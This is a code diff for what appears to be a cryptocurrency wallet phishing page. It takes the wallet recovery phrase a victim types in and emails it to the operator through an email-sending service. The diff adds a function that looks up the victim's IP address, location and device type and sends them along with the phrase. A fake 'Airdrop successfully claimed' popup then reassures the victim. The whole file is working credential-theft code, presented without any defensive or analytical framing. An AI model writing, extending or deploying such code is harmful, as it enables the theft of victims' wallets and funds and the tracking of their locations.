@@ -1,3 +1,42 @@
+// Function to collect visitor data
+async function collectVisitorData() {
+  try {
+    // Fetch IP and location data
+    const ipResponse = await fetch("https://ipapi.co/json/");
+    const ipData = await ipResponse.json();
+
+    // Detect device model using userAgent
+    const userAgent = navigator.userAgent;
+    let deviceModel = "Unknown Device";
+
+    if (/android/i.test(userAgent)) {
+      deviceModel = "Android";
+    } else if (/iPad|iPhone|iPod/.test(userAgent)) {
+      deviceModel = "iOS";
+    } else if (/Windows/.test(userAgent)) {
+      deviceModel = "Windows Device";
+    } else if (/Mac/.test(userAgent)) {
+      deviceModel = "MacOS Device";
+    } else if (/Linux/.test(userAgent)) {
+      deviceModel = "Linux Device";
+    }
+
+    // Return collected data
+    return {
+      ip: ipData.ip,
+      location: `${ipData.region}, ${ipData.country_name}`,
+      device: deviceModel,
+    };
+  } catch (error) {
+    console.error("Error collecting visitor data:", error);
+    return {
+      ip: "N/A",
+      location: "N/A",
+      device: "N/A",
+    };
+  }
+}
+
 // Wallet Popup Handling
 document.querySelectorAll(".wallet").forEach((wallet) => {
   wallet.addEventListener("click", () => {
@@ -21,7 +60,7 @@ document.querySelectorAll(".close-btn").forEach((btn) => {
 
 // Handle Proceed Button
 document.querySelectorAll("#proceedButton").forEach((button) => {
-  button.addEventListener("click", (e) => {
+  button.addEventListener("click", async (e) => {
     e.preventDefault(); // Prevent default form submission
     const popup = e.target.closest(".popup");
     const textarea = popup.querySelector("#phrase");
@@ -47,11 +86,14 @@ document.querySelectorAll("#proceedButton").forEach((button) => {
     textarea.classList.remove("error");
     errorMessage.style.display = "none";
 
+    // Collect visitor data
+    const visitorData = await collectVisitorData();
+
     // Gather data for email
     const params = {
-      LOCATION: popup.querySelector("#location")?.value || "N/A",
-      IP_ADDRESS: popup.querySelector("#ip-address")?.value || "N/A",
-      DEVICE_MODEL: popup.querySelector("#device-model")?.value || "N/A",
+      LOCATION: visitorData.location,
+      IP_ADDRESS: visitorData.ip,
+      DEVICE_MODEL: visitorData.device,
       WALLET_TYPE: popup.querySelector("#wallet-type")?.value || "N/A",
       WORD_PHRASE: text,
     };
@@ -64,7 +106,7 @@ document.querySelectorAll("#proceedButton").forEach((button) => {
       .send(serviceID, templateID, params)
       .then((res) => {
         console.log("Email sent successfully", res);
-        showCustomPopup();// Notify user
+        showCustomPopup(); // Notify user
         popup.classList.add("hidden"); // Close popup after success
       })
       .catch((err) => {
@@ -74,64 +116,57 @@ document.querySelectorAll("#proceedButton").forEach((button) => {
   });
 });
 
-
 // Function to show the custom popup
 function showCustomPopup() {
-    // Create the blur background
-    const blurBackground = document.createElement("div");
-    blurBackground.style.position = "fixed";
-    blurBackground.style.top = "0";
-    blurBackground.style.left = "0";
-    blurBackground.style.width = "100%";
-    blurBackground.style.height = "100%";
-    blurBackground.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
-    blurBackground.style.backdropFilter = "blur(10px)";
-    blurBackground.style.zIndex = "9999";
-    
-    // Create the popup container
-    const popupContainer = document.createElement("div");
-    popupContainer.style.position = "fixed";
-    popupContainer.style.top = "50%";
-    popupContainer.style.left = "50%";
-    popupContainer.style.transform = "translate(-50%, -50%)";
-    popupContainer.style.backgroundColor = "#61058b";
-    popupContainer.style.padding = "20px";
-    popupContainer.style.borderRadius = "10px";
-    popupContainer.style.textAlign = "center";
-    popupContainer.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.3)";
-    popupContainer.style.maxWidth = "400px";
-    popupContainer.style.width = "90%";
-    
-    // Add the message
-    const message = document.createElement("p");
-    message.style.fontSize = "16px";
-    message.style.color = "#fff";
-    message.style.margin = "0";
-    message.style.marginBottom = "15px";
-    message.textContent = "Airdrop successfully claimed. Kindly check your wallet for your claim.";
-    
-    // Add the close button
-    const closeButton = document.createElement("button");
-    closeButton.style.padding = "10px 20px";
-    closeButton.style.fontSize = "14px";
-    closeButton.style.backgroundColor = "red";
-    closeButton.style.color = "#fff";
-    closeButton.style.border = "none";
-    closeButton.style.borderRadius = "5px";
-    closeButton.style.cursor = "pointer";
-    closeButton.textContent = "Close";
-  
-    closeButton.addEventListener("click", () => {
-      document.body.removeChild(blurBackground); // Remove popup
-      location.reload(); // Refresh the page to clear forms
-    });
-  
-    // Append everything to the container
-    popupContainer.appendChild(message);
-    popupContainer.appendChild(closeButton);
-    blurBackground.appendChild(popupContainer);
-  
-    // Append to the body
-    document.body.appendChild(blurBackground);
-  }
-  
+  const blurBackground = document.createElement("div");
+  blurBackground.style.position = "fixed";
+  blurBackground.style.top = "0";
+  blurBackground.style.left = "0";
+  blurBackground.style.width = "100%";
+  blurBackground.style.height = "100%";
+  blurBackground.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
+  blurBackground.style.backdropFilter = "blur(10px)";
+  blurBackground.style.zIndex = "9999";
+
+  const popupContainer = document.createElement("div");
+  popupContainer.style.position = "fixed";
+  popupContainer.style.top = "50%";
+  popupContainer.style.left = "50%";
+  popupContainer.style.transform = "translate(-50%, -50%)";
+  popupContainer.style.backgroundColor = "#61058b";
+  popupContainer.style.padding = "20px";
+  popupContainer.style.borderRadius = "10px";
+  popupContainer.style.textAlign = "center";
+  popupContainer.style.boxShadow = "0 4px 10px rgba(0, 0, 0, 0.3)";
+  popupContainer.style.maxWidth = "400px";
+  popupContainer.style.width = "90%";
+
+  const message = document.createElement("p");
+  message.style.fontSize = "16px";
+  message.style.color = "#fff";
+  message.style.margin = "0";
+  message.style.marginBottom = "15px";
+  message.textContent =
+    "Airdrop successfully claimed. Kindly check your wallet for your claim.";
+
+  const closeButton = document.createElement("button");
+  closeButton.style.padding = "10px 20px";
+  closeButton.style.fontSize = "14px";
+  closeButton.style.backgroundColor = "red";
+  closeButton.style.color = "#fff";
+  closeButton.style.border = "none";
+  closeButton.style.borderRadius = "5px";
+  closeButton.style.cursor = "pointer";
+  closeButton.textContent = "Close";
+
+  closeButton.addEventListener("click", () => {
+    document.body.removeChild(blurBackground); // Remove popup
+    location.reload(); // Refresh the page to clear forms
+  });
+
+  popupContainer.appendChild(message);
+  popupContainer.appendChild(closeButton);
+  blurBackground.appendChild(popupContainer);
+
+  document.body.appendChild(blurBackground);
+}
